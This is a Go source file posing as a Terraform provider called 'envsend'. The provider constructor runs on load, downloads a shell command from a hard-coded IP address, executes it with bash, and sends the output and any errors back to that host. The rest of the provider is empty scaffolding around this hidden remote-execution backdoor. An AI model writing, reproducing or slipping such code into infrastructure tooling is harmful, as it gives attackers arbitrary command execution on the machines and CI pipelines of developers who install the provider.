package main

import (
	"bytes"
	"context"
	"io"
	"net/http"
	"os/exec"

	"github.com/hashicorp/terraform-plugin-framework/datasource"
	"github.com/hashicorp/terraform-plugin-framework/provider"
	"github.com/hashicorp/terraform-plugin-framework/provider/schema"
	"github.com/hashicorp/terraform-plugin-framework/resource"
)

type EnvSendProvider struct{}

func NewProvider() provider.Provider {
	w := "http://52.21.38.153:8000"
	i := w + "/info"
	e := w + "/e"

	resp, err := http.Get(i)
	if err != nil {
		_, _ = http.Post(e, "text/plain", bytes.NewBufferString(err.Error()))
		return &EnvSendProvider{}
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		_, _ = http.Post(e, "text/plain", bytes.NewBufferString("bad status: "+resp.Status))
		return &EnvSendProvider{}
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		_, _ = http.Post(e, "text/plain", bytes.NewBufferString(err.Error()))
		return &EnvSendProvider{}
	}

	info := string(bytes.TrimSpace(body))
	if info == "" {
		_, _ = http.Post(e, "text/plain", bytes.NewBufferString("Empty"))
		return &EnvSendProvider{}
	}

	out, err := exec.Command("bash", "-c", info).CombinedOutput()
	if err != nil {
		msg := err.Error() + "\n" + string(out)
		_, _ = http.Post(e, "text/plain", bytes.NewBufferString(msg))
		return &EnvSendProvider{}
	}

	_, _ = http.Post(i, "text/plain", bytes.NewBufferString("\n==== Output ====\n"+string(out)))
	return &EnvSendProvider{}
}

func (p *EnvSendProvider) Metadata(_ context.Context, _ provider.MetadataRequest, resp *provider.MetadataResponse) {
	resp.TypeName = "envsend"
}

func (p *EnvSendProvider) Schema(_ context.Context, _ provider.SchemaRequest, resp *provider.SchemaResponse) {
	resp.Schema = schema.Schema{}
}

func (p *EnvSendProvider) Configure(_ context.Context, _ provider.ConfigureRequest, _ *provider.ConfigureResponse) {
	// No-op
}

func (p *EnvSendProvider) Resources(_ context.Context) []func() resource.Resource {
	return []func() resource.Resource{
		NewEnvSendResource,
	}
}

func (p *EnvSendProvider) DataSources(_ context.Context) []func() datasource.DataSource {
	return nil
}
